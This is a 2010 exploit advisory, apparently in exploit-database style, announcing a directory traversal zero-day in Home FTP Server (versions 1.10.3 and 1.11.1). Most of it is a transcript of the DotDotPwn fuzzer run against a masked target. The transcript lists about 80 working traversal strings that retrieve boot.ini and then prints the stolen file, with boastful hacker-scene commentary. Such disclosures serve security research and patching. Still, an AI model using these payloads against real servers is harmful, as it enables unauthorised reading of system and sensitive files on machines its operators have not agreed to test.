@@ -1,0 +1,243 @@
+# Exploit Title: Home FTP Server Directory Traversal
+# Date: Oct 28, 2010
+# Author: chr1x
+# Software Link: http://downstairs.dnsalias.net/files/HomeFtpServerInstall.exe
+# Description: Home Ftp Server is an easy to use FTP server, that allows you to share files directly from your PC with lots of setup possibilities. You can set up user accounts, specify directory permissions and monitor access to individual files. It supports virtual directories, banned IP addresses and offers a web based administration interface that lets you add users and view current statistics.. and much more.
+# Version(s): vr1.10.3 (build 144) AND v r1.11.1 (build 149) <- Yeah, two versions, same payloads! ]¬) 
+# Tested on: Windows XP SP3 (Spanish Edition)
+
+
+****************************************************************************************************************************
+*************************    As 0-day exclusively for the BugCon 2010 Security Conferences!   ******************************
+*************************                     http://www.bugcon.org                           ******************************
+****************************************************************************************************************************
+
+<start of dotdotpwning the machinehz>
+
+root@voltron:/dotdotpwn-v2.1# perl dotdotpwn.pl -h XXX.XXX.X.XX -m ftp -U abc123 -P abc123 -t 25 -f boot.ini -q
+#################################################################################
+#                                                                               #
+#  CubilFelino                                                       Chatsubo   #
+#  Security Research Lab              and            [(in)Security Dark] Labs   #
+#  chr1x.sectester.net                             chatsubo-labs.blogspot.com   #
+#                                                                               #
+#                               pr0udly present:                                #
+#                                                                               #
+#  ________            __  ________            __  __________                   #
+#  \______ \    ____ _/  |_\______ \    ____ _/  |_\______   \__  _  __ ____    #
+#   |    |  \  /  _ \\   __\|    |  \  /  _ \\   __\|     ___/\ \/ \/ //    \   #
+#   |    `   \(  <_> )|  |  |    `   \(  <_> )|  |  |    |     \     /|   |  \  #
+#  /_______  / \____/ |__| /_______  / \____/ |__|  |____|      \/\_/ |___|  /  #
+#          \/                      \/                                      \/   #
+#                               - DotDotPwn v2.1 -                              #
+#                         The Traversal Directory Fuzzer                        #
+#                         http://dotdotpwn.sectester.net                        #
+#                            dotdotpwn@sectester.net                            #
+#                                                                               #
+#                              by chr1x & nitr0us                               #
+#################################################################################
+
+
+[========== TARGET INFORMATION ==========]
+[+] Hostname: XXX.XXX.X.XX
+[+] Protocol: ftp
+[+] Port: 21
+
+[=========== TRAVERSAL ENGINE ===========]
+[+] Creating Traversal patterns (mix of dots and slashes)
+[+] Permuting 6 times the traversal patterns (-d switch)
+[+] Creating the Special Traversal patterns
+[+] Translating (back)slashes in the filenames
+[+] Appending 'boot.ini' to the Traversal Strings
+[+] Including Special sufixes
+[+] Traversal Engine DONE ! - Total traversal tests created: 1164
+
+[=========== TESTING RESULTS ============]
+[+] Ready to launch 40.00 traversals per second
+[+] Press any key to start the testing (You can stop it pressing Ctrl + C)
+
+[+] Username: abc123
+[+] Password: abc123
+[+] Connecting to the FTP server at 'XXX.XXX.X.XX' on port 21
+[+] FTP Server's Current Path: /
+[+] Local Path to download files: /dotdotpwn-v2.1/retrieved_files
+[+] Press any key to continue
+
+[+] Testing ...
+.
+[*] GET ../../../boot.ini <- VULNERABLE!
+
+[*] GET ../../../../boot.ini <- VULNERABLE!
+
+[*] GET ../../../../../boot.ini <- VULNERABLE!
+
+[*] GET ../../../../../../boot.ini <- VULNERABLE!
+
+[*] GET ..\..\..\boot.ini <- VULNERABLE!
+
+[*] GET ..\..\..\..\boot.ini <- VULNERABLE!
+
+[*] GET ..\..\..\..\..\boot.ini <- VULNERABLE!
+
+[*] GET ..\..\..\..\..\..\boot.ini <- VULNERABLE!
+. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .
+[*] GET ..//..//..//boot.ini <- VULNERABLE!
+
+[*] GET ..//..//..//..//boot.ini <- VULNERABLE!
+
+[*] GET ..//..//..//..//..//boot.ini <- VULNERABLE!
+
+[*] GET ..//..//..//..//..//..//boot.ini <- VULNERABLE!
+
+[*] GET ..///..///..///boot.ini <- VULNERABLE!
+
+[*] GET ..///..///..///..///boot.ini <- VULNERABLE!
+
+[*] GET ..///..///..///..///..///boot.ini <- VULNERABLE!
+
+[*] GET ..///..///..///..///..///..///boot.ini <- VULNERABLE!
+
+[*] GET ..\\..\\..\\boot.ini <- VULNERABLE!
+
+[*] GET ..\\..\\..\\..\\boot.ini <- VULNERABLE!
+
+[*] GET ..\\..\\..\\..\\..\\boot.ini <- VULNERABLE!
+
+[*] GET ..\\..\\..\\..\\..\\..\\boot.ini <- VULNERABLE!
+
+[*] GET ..\\\..\\\..\\\boot.ini <- VULNERABLE!
+
+[*] GET ..\\\..\\\..\\\..\\\boot.ini <- VULNERABLE!
+
+[*] GET ..\\\..\\\..\\\..\\\..\\\boot.ini <- VULNERABLE!
+
+[*] GET ..\\\..\\\..\\\..\\\..\\\..\\\boot.ini <- VULNERABLE!
+.
+[*] GET ../\../\../\boot.ini <- VULNERABLE!
+
+[*] GET ../\../\../\../\boot.ini <- VULNERABLE!
+
+[*] GET ../\../\../\../\../\boot.ini <- VULNERABLE!
+
+[*] GET ../\../\../\../\../\../\boot.ini <- VULNERABLE!
+
+[*] GET ..\/..\/..\/boot.ini <- VULNERABLE!
+
+[*] GET ..\/..\/..\/..\/boot.ini <- VULNERABLE!
+
+[*] GET ..\/..\/..\/..\/..\/boot.ini <- VULNERABLE!
+
+[*] GET ..\/..\/..\/..\/..\/..\/boot.ini <- VULNERABLE!
+
+[*] GET ../\/../\/../\/boot.ini <- VULNERABLE!
+
+[*] GET ../\/../\/../\/../\/boot.ini <- VULNERABLE!
+
+[*] GET ../\/../\/../\/../\/../\/boot.ini <- VULNERABLE!
+
+[*] GET ../\/../\/../\/../\/../\/../\/boot.ini <- VULNERABLE!
+
+[*] GET ..\/\..\/\..\/\boot.ini <- VULNERABLE!
+
+[*] GET ..\/\..\/\..\/\..\/\boot.ini <- VULNERABLE!
+
+[*] GET ..\/\..\/\..\/\..\/\..\/\boot.ini <- VULNERABLE!
+
+[*] GET ..\/\..\/\..\/\..\/\..\/\..\/\boot.ini <- VULNERABLE!
+
+[*] GET \../\../\../boot.ini <- VULNERABLE!
+
+[*] GET \../\../\../\../boot.ini <- VULNERABLE!
+
+[*] GET \../\../\../\../\../boot.ini <- VULNERABLE!
+
+[*] GET \../\../\../\../\../\../boot.ini <- VULNERABLE!
+.
+[*] GET /..\/..\/..\boot.ini <- VULNERABLE!
+
+[*] GET /..\/..\/..\/..\boot.ini <- VULNERABLE!
+
+[*] GET /..\/..\/..\/..\/..\boot.ini <- VULNERABLE!
+
+[*] GET /..\/..\/..\/..\/..\/..\boot.ini <- VULNERABLE!
+.
+[*] GET ./.././.././../boot.ini <- VULNERABLE!
+
+[*] GET ./.././.././.././../boot.ini <- VULNERABLE!
+
+[*] GET ./.././.././.././.././../boot.ini <- VULNERABLE!
+
+[*] GET ./.././.././.././.././.././../boot.ini <- VULNERABLE!
+
+[*] GET .\..\.\..\.\..\boot.ini <- VULNERABLE!
+
+[*] GET .\..\.\..\.\..\.\..\boot.ini <- VULNERABLE!
+
+[*] GET .\..\.\..\.\..\.\..\.\..\boot.ini <- VULNERABLE!
+
+[*] GET .\..\.\..\.\..\.\..\.\..\.\..\boot.ini <- VULNERABLE!
+
+[*] GET .//..//.//..//.//..//boot.ini <- VULNERABLE!
+
+[*] GET .//..//.//..//.//..//.//..//boot.ini <- VULNERABLE!
+
+[*] GET .//..//.//..//.//..//.//..//.//..//boot.ini <- VULNERABLE!
+
+[*] GET .//..//.//..//.//..//.//..//.//..//.//..//boot.ini <- VULNERABLE!
+.
+[*] GET .\\..\\.\\..\\.\\..\\boot.ini <- VULNERABLE!
+
+[*] GET .\\..\\.\\..\\.\\..\\.\\..\\boot.ini <- VULNERABLE!
+
+[*] GET .\\..\\.\\..\\.\\..\\.\\..\\.\\..\\boot.ini <- VULNERABLE!
+
+[*] GET .\\..\\.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\boot.ini <- VULNERABLE!
+. . . . .
+[*] GET ///../../../boot.ini <- VULNERABLE!
+
+[*] GET ///../../../../boot.ini <- VULNERABLE!
+
+[*] GET ///../../../../../boot.ini <- VULNERABLE!
+
+[*] GET ///../../../../../../boot.ini <- VULNERABLE!
+
+[*] GET ///..\..\..\boot.ini <- VULNERABLE!
+
+[*] GET ///..\..\..\..\boot.ini <- VULNERABLE!
+
+[*] GET ///..\..\..\..\..\boot.ini <- VULNERABLE!
+
+[*] GET ///..\..\..\..\..\..\boot.ini <- VULNERABLE!
+
+[*] GET \\\../../../boot.ini <- VULNERABLE!
+
+[*] GET \\\../../../../boot.ini <- VULNERABLE!
+
+[*] GET \\\../../../../../boot.ini <- VULNERABLE!
+
+[*] GET \\\../../../../../../boot.ini <- VULNERABLE!
+
+[*] GET \\\..\..\..\boot.ini <- VULNERABLE!
+
+[*] GET \\\..\..\..\..\boot.ini <- VULNERABLE!
+
+[*] GET \\\..\..\..\..\..\boot.ini <- VULNERABLE!
+
+[*] GET \\\..\..\..\..\..\..\boot.ini <- VULNERABLE!
+. . . .
+[+] Fuzz testing finished after 0.65 minutes (39 seconds)
+[+] Total Traversals found: 80 <<------------------------------Yeah! thiz zhit w0rkz kiTtehz! xDD
+root@voltron:/dotdotpwn-v2.1# cat retrieved_files/boot.ini
+[boot loader]
+timeout=30
+default=multi(0)disk(0)rdisk(0)partition(1)\WINDOWS
+[operating systems]
+multi(0)disk(0)rdisk(0)partition(1)\WINDOWS="Microsoft Windows XP Professional" /noexecute=optin /fastdetect
+root@voltron:/dotdotpwn-v2.1#
+
+</end of dotdotpwning the machinehz>
+
+
+ Download the DotDotPwn v2.1 from the oficial site http://dotdotpwn.sectester.net or from the mirror at http://chatsubo-labs.blogspot.com.
+
+ Vote for DotDotPwn as tool for next BackTrack release!! -> http://www.backtrack-linux.org/forums/tool-requests/32082-dotdotpwn.html
